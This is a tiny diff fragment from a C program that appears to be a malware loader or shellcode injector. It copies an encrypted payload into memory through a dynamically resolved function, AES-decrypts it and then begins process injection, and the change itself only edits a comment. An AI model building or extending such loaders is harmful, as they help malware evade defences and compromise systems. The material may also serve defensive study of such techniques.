@@ -456,7 +456,7 @@ int main(void) {
 	// Copy payl to new memory buffer
 	pRtlMoveMemory(emem, payl, payl_len);
 	
-	// Decrypt (DeXOR) the payl
+	// Decrypt the payl
 	AESDecrypt((char *) emem, payl_len, pkey, sizeof(pkey));
 	
 	// Injopn process starts here...
